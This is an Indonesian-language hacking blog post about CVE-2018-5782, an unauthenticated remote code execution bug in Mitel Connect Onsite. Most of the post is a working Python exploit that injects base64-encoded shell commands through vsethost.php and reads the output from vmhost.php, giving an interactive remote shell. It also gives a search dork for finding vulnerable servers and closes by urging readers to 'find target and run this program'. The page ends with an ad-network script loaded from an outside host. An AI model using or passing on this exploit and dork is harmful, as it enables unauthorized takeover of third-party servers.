Title: CVE 2018-5782: Mitel connect onsite 19.49.5200.0 RCE
Date: 5, sep 2021.
Tags: hacking, cve
Slug: blog/CVE-2018-5782-Mitel-connect-onsite-19.49.5200.0-RCE
Author: Ardho Ainullah

Sebuah bug yang sudah berkarat, tapi masih saya sukai.
Oke pada kelemahan ini memungkinkan kamu bisa melakukan perintah shell (RCE)
tanpa otenkasi (Unauthenticated). beberapa dari situs yang rentan pada bug
ini tidak writable menggunakan wget / curl. gunakan "echo" sebagai gantinya.
<br><br>
<pre><code class="plaintext">Dork: +"Public" +"My Conferences" +"Personal Library" +"My Profile"
</code></pre>
<br><br>
Perlu diingat ini hanya untuk sebatas pengetahuan, jangan sampai ngerugiin orang :)


Exploit Script:
```python
import base64, requests, sys
import readline
def build_shoretel(cmd):
        obj = {
                "hostId": "system",
                "keyCode": "base64_decode",
                "meetingType": "{${gKeyCode}($gSessionDir)}",
                "sessionDir": base64.b64encode(bytes(cmd, "utf-8")).decode("ascii"),
                "swfServer": "{${gHostID}($gMeetingType)}",
                "server": "exec",
                "dir": "/usr/share/apache2/htdocs/wc2_deploy/scripts/"
        }
        return obj

def exploit():
        if len(sys.argv) < 2: sys.exit("python filename.py <site>")
        url = sys.argv[1]
        c = requests.get(url+"/scripts/vsethost.php",params = build_shoretel("echo bWVua3JlcDEzMzcK"))
        if requests.get(url+"/scripts/vmhost.php").text.strip() == "bWVua3JlcDEzMzcK":
                print("Target VULN..!!!")
                while True:
                        cmd = input("SYSTEM: ~$ ")
                        requests.get(url+"/scripts/vsethost.php", params = build_shoretel(cmd))
                        c = requests.get(url+"/scripts/vmhost.php")
                        print(c.text if c.text != "" else "No output")
        else:
                print("[!] Not Vuln")

if __name__=="__main__":
   exploit()
```

Just find target and run this program!
<br><br>
<script type="text/javascript">
	atOptions = {
		'key' : 'e00dc4387e6c63802d3ac0af944c2eb6',
		'format' : 'iframe',
		'height' : 250,
		'width' : 300,
		'params' : {}
	};
	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.highperformancedformats.com/e00dc4387e6c63802d3ac0af944c2eb6/invoke.js"></scr' + 'ipt>');
</script>
